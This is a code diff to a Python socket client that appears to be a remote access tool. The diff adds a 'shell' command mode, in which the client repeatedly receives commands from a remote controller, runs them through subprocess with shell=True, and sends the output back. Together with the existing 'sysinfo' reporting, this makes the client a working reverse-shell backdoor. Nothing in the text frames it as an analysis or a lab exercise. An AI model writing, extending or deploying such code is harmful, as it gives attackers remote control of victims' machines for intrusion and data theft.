@@ -1,4 +1,6 @@
 #!/usr/bin/env python
+# ---------- LIBRARIES ---------- #
+# Global (System)
 import socket
 import subprocess
 import os
@@ -9,6 +11,7 @@ from os import remove
 import json
 import platform
 import pathlib
+
 
 class CommandHandler():
     def connectionCheck(self) -> str:
@@ -28,6 +31,15 @@ class CommandHandler():
             return data
         except:
             return 'Error Getting Sysinfo'
+
+    def shell(self, command: str):
+        if command[:3] == 'cd ':
+            os.chdir(command[3:])
+            return str.encode(os.getcwd())
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            return result
 
 class Client(CommandHandler):
     def __init__(self):
@@ -49,6 +61,14 @@ class Client(CommandHandler):
             elif data.decode() == 'sysinfo':
                 data = self.sysinfo()
                 self.sock.send(data.encode())
+            elif data.decode() == 'shell':
+                while True:
+                    data = self.sock.recv(20480)
+                    print(data)
+                    if data.decode() == 'exit':
+                        break
+                    result = self.shell(data.decode())
+                    self.sock.send(result)
 
 def main():
     Client()
